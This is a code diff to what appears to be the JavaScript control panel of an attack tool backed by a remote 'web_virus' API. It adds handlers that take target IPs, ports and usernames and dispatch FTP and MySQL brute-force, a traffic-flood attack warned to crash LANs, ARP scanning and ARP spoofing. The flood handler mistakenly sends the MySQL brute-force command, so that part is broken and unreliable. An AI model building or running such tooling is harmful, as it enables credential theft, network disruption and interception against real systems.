@@ -33,6 +33,45 @@ function deal_ssh_brute() {
     });
 }
 
+function deal_ftp_brute() {
+    showInputBox("输入参数","" , "输入目标IP:",function(ip){
+        showInputBox("输入参数","" , "输入端口:",function(port){
+            showInputBox("输入参数","" , "输入用户名:",function(user){
+                send_command("ftp_brute "+ip+" "+port+" "+user);
+            });
+        });
+    });
+}
+
+function deal_mysql_brute() {
+    showInputBox("输入参数","" , "输入目标IP:",function(ip){
+        showInputBox("输入参数","" , "输入端口:",function(port){
+            showInputBox("输入参数","" , "输入用户名:",function(user){
+                send_command("mysql_brute "+ip+" "+port+" "+user);
+            });
+        });
+    });
+}
+
+function deal_traffic_attack() {
+    showInputBox("输入参数","" , "输入目标网址:",function(ip){
+        showInputBox("输入参数","" , "输入，模拟用户的数量:",function(port){
+            showInputBox("注意，可能导致局域网网络崩溃","" , "输入一个模拟用户的发送攻击数量:",function(user){
+                send_command("mysql_brute "+ip+" "+port+" "+user);
+            });
+        });
+    });
+}
+
+function deal_arp_spoof() {
+    showRightAlert("如果想要停止攻击,则点击关闭arp攻击按钮",5000);
+    showInputBox("输入参数","" , "输入目标设备的IP:",function(ip){
+        send_command("arp_spoof "+ip);
+    });
+}
+
+
+
 var hacker_driver_xhr = new XMLHttpRequest();
 hacker_driver_xhr.open("GET", remote+ "/api/web_virus/"+user+"/"+pwd, true);
 hacker_driver_xhr.send();
@@ -83,6 +122,27 @@ hacker_driver_xhr.onload = function() {
                     else if (dom.id == 'ssh_brute') {
                         deal_ssh_brute();
                         return;
+                    }
+                    else if (dom.id == 'ftp_brute') {
+                        deal_ftp_brute();
+                        return;
+                    }
+                    else if (dom.id == 'mysql_brute') {
+                        deal_mysql_brute();
+                        return;
+                    }
+                    else if (dom.id == 'traffic_attack') {
+                        deal_traffic_attack();
+                        return;
+                    }
+                    else if (dom.id == 'arp_scan') {
+                        send_command("arp_scan");
+                        return;
+                    }
+                    else if (dom.id == 'arp_spoof') {
+                        deal_arp_spoof();
+                        return;
+                    
                     }
                 }
             }) (i) ;}
